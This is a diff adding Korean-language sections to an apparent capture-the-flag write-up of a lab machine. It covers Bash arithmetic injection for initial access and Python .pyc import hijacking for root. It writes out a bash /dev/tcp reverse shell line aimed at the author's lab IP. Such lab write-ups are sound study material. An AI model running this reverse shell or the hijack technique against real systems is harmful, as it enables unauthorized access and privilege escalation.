@@ -111,10 +111,108 @@ by. 365kim](https://365kim.tistory.com/169)
 
 솔직이 이전 Easy 문제들 생각해서 여기 나오는 backups에 뭔가 정보가 있거나 과거 commit 정보에 민감한 정보, 혹은 log에라도 뭔가있을줄 알았는데 log는 진짜 로그 정보만 있고 backups에는 텅 빈 백업 파일만, 다른 소스 코드에는 취약한 부분이 안 보였기에 진짜 여기서 삽질을 많이 했다. (내가 찾던건 하드코딩된 민감한 정보들이었는데.... 여기가 타겠이었...)
 
-처음으론 gitea의 버전 정보를 찾아보며 취약점이 있을까 뒤져보기도 하고, dirsearch로 페이지 싹 뒤져보거나 gitea를 둘러보고 회원가입은 안되서 불가(내부에서 회원가입 가능한데 이게 그 섭 도메인이라 그런듯?)였기에 거진 2-3일간 여기서 멈춰버렸다.
+처음으론 gitea의 버전 정보를 찾아보며 취약점이 있을까 뒤져보기도 하고, dirsearch로 페이지 싹 뒤져보거나 gitea를 둘러보고 회원가입은 안되서 불가(내부에서 회원가입이 있기는 한데 이게 내부 섭 도메인이라 그런듯? 정확한건 찾아봐야함)였기에 거진 2-3일간 여기서 멈춰버렸다.
 
 ## 초기 침투 (Initial Foothold / Exploitation)
 
+![approute](https://github.com/user-attachments/assets/547da4a9-eb79-432d-9dbd-d8ce235e1bb0)
+
+프로그램 내용에서 `app.py`를 읽어보기만 하고 그냥 넘어갔었는데 삽질을 한 뒤에 다시 찾아와 코드를 자세히 읽어보며 분석을 해보니 `@app.route` 부분에 `./routines.sh`라는 쉘 코드를 실행시켜주는 것을 확인할 수 있었다.
+
+여기서 바로 shell을 실행시킬 수 있었으면 좋으련만 그러기 위해서는 `shell=True`가 쓰여있어야 가능하기에 이제 쉘 코드를 읽어보기 시작했다.
+
+![routinessh](https://github.com/user-attachments/assets/e0e300f3-015a-421c-9303-9374100c11b4)
+
+긴 쉘 스크립트가 있는데 여기서 `if [[ "$1" -eq 0 ]];` 부분이 산술 표현식 주입 (Arithmetic Expression Injection)이 가능하다고 한다.
+
+이것이 무엇인고 하니,
+
+![산술 표현식 주입](https://github.com/user-attachments/assets/68930cc0-d832-4010-9da5-774908ebe121)
+
+이라고 한다.
+
+으흠 그니까 bash 스크립트에서 `-eq`가 숫자로 해석하려는데 그 안에 `"우언가 계산할거"`가 있으면 그걸 실행시켜버린다는 그런 취약점이다. 만...
+
+이게 있는 표현인가?
+
+![있나봄](https://github.com/user-attachments/assets/b0078808-c97a-4aa1-8572-001e0356e669)
+
+있는 표현인가보다... 아마도?
+
+허튼 우리는 이 부분에 뭔가 추가해서 Bash가 인자로 넣기 전에 인자 안에 명령어를 실행해버리는 그런 취약점이다.
+
+그러므로 
+
+![manifest](https://github.com/user-attachments/assets/54875258-21ee-4aa2-a6d4-bc5038f8a395)
+
+다시 업로드할 두 chrome extention? 파일을 만들고 `bash -i >& /dev/tcp/10.10.14.184/4444 0>&1` 가 들어간 리버스 쉘을 만들어 내 컴퓨터의 서버에서 다운받을 수 있게 했다.
+
+여기서 좀 뭔가 평소의 페이로드랑 다르게 더 긴데 그 이유랄까 
+
+처음에는 그냥 base64인코딩을 했더니 그 내부에 `/`나 `+`가 있었는지 디렉토리로 구분되어 자꾸 문제가 생겨서 공백으로 교체하는 부분을 추가했다.
+
+그리고 혹시 진짜 혹시 몰라서 bash에 문제가 생기지 않게 `%20(공백)`이나 `%7C`등을 넣었다.
+
+![reverse](https://github.com/user-attachments/assets/1407036e-2ce4-4078-86c7-88f970d65d79)
+
+그렇게 리버스 쉘 성공! `larry`의 계정을 얻는데 성공했다.
+
+![usertxt](https://github.com/user-attachments/assets/5f412051-c652-4c20-a0c1-2179ce67e5b1)
+
+그렇게 플래그를 찾을 수 있었다!
+
 ## 권한 상승 (Privilege Escalation) 
 
+솔직히 뭐랄까.. 내가 소스코드 분석을 많이 안해보기도 했고 코딩은 하긴 했다만 취약점 찾는걸 안해봤어서 뭔가 초기 침투 과정이 훨씬 더 오래걸리고 삽질을 많이 했었다.
+
+![sudol](https://github.com/user-attachments/assets/5901cb01-36a4-4bda-af63-1d3a0564ccf8)
+
+이젠 거의 관례나 마찬가지인 `sudo -l`을 하면서 `/opt/extensiontool/extention_tool.py`라는 스크립트가 발견되었다.
+
+![코드 분석](https://github.com/user-attachments/assets/33bd8b5e-2d36-40fe-8935-3187a687b201)
+
+그리고 어쩌피 이 스크립트는 인터넷에 검색해도 많이 사용되거나 한 코드가 아니라고 확인되어 이번에는 실수하지 않고 꼼꼼히 코드를 분석하기 시작했고 생각보다 가장 처음 부분이 포인트였다.
+
+`import extension_utils` 즉 모듈이 있는 `__pycache__` 디렉토리의 권한을 확인해보니 `drwxrwxrwx` 즉 `777` 권한이었다. 세상에.
+
+아니 솔직히 이것도 몰라서 ㅋㅋㅋ 제 선생에게 여기서 제가 도대체 뭘 보아야 합니까 하고 물어봐서 어디를 살펴볼지 찾아냈다.
+
+`__pycache__`가 무엇인지에 대해서는 [Python의 pycache 완벽 이해: 알아야 할 모든 것 by. Kana Mikami](https://docs.kanaries.net/ko/topics/Python/pycache)를 읽어보면 좋다.
+
+우리가 여기서 진행할 것은 바로! `Python Import Hijacking`이다.
+
+[Privilege Escalation: python library hijacking / Neu@security-blog](https://neutrinox4b1.tistory.com/95)
+
+위를 참고해 공부하면 좋다.
+
+그렇기에 우리는 `extension_utils`의 `.pyc` 파일을 우리의 루트로 올라가는 코드로 바꿔치기를 하면 되는데 이게 그냥 바꿔치기 해버리면 `헤더 정보`가 맞지 않는다며 실행이 안되기에 헤더 이식 과정까지 하나의 코드로 구현했다.
+
+![실행](https://github.com/user-attachments/assets/eac4c3a1-5328-4b38-b926-2f4e618541a8)
+
+1. larry의 계정으로 `extention_tool.py`를 한번 실행시키자.
+
+![binbash](https://github.com/user-attachments/assets/fd88de12-bb26-4210-9dba-07874358f8d5)
+
+2. python 권한 상승 파일을 만들어 컴파일해 `.pyc` 파일을 만들자.
+
+![헤더 변조](https://github.com/user-attachments/assets/98085d7e-534a-4d7a-963e-fe36460e3eaf)
+
+3. 그 후 정상 헤더를 가져와 내가 만든 악성 코드에 넣으면 된다. 그리고 난 그건 파이썬 코드로 짜서 진행했다.
+
+그리고 다시 sudo를 넣어서 extention_tool.py를 실행 하면?
+
+![루트 얻기 성공](https://github.com/user-attachments/assets/252fa2e7-97c4-4b23-905c-30e461781123)
+
+루트 얻기 성공!!
+
 ## 마치며
+
+![Browsed has been Pwned](https://github.com/user-attachments/assets/cc6b9445-79ea-429a-8074-85aba8e4081a)
+
+이번 문제를 풀면서 점점 그저 스크립트를 가져와 쓰는 것이 아니라 소스 코드를 분석하고 그에 따른 활용 방안을 공부하여 머신을 해결해 나가는 진짜 해킹에 좀 더 가까워진 느낌이라 기분이 좋다.
+
+이번건 Writeup도 없거니와 지금까지 풀던 느낌이랑은 또 달라서 풀고나서는 꽤나 재밌는 문제였다. 풀고 나서는...
+
+SSRF와 Bash 취약점, 파이썬 바이트 코드 조작까지, Gitea 웹사이트 자체에서 눈이 팔리지만 않았다면 시간을 많이 안썼을지도? 그래도 확실히 `Think Out Side the Box` 가 얼마나 중요한 말인지 한번 더 생각하게 된 문제였다. 하나에 매몰되지 말기!
+
+Happy Hacking!
